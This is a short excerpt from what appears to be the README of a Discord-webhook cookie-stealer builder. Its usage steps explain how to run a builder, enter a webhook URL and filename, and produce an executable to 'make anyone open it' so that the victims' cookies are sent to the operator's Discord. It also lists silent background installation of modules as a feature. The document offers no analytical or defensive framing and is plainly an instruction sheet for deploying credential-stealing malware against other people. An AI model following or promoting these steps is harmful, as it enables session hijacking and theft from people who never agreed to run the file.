...
Features
 ...
 - Automatic installation of missing modules - The script automatically installs any missing required modules in the background if they are not already present on the user's machine.

   Usage
1. Clone the repository or download the script.
2. Run the Build.exe and wait for 3 seconds until the console is gone
3. When the console is gone open the app.exe and enter ur webhook url and enter whatever your filename to be
4. After entered webhook you open file explorer and go to Desktop and there you should find DIST
5. open dist and there is your "filenameyouentered"
6. Then ur done make anyone open it and look at discord and see their cookies!
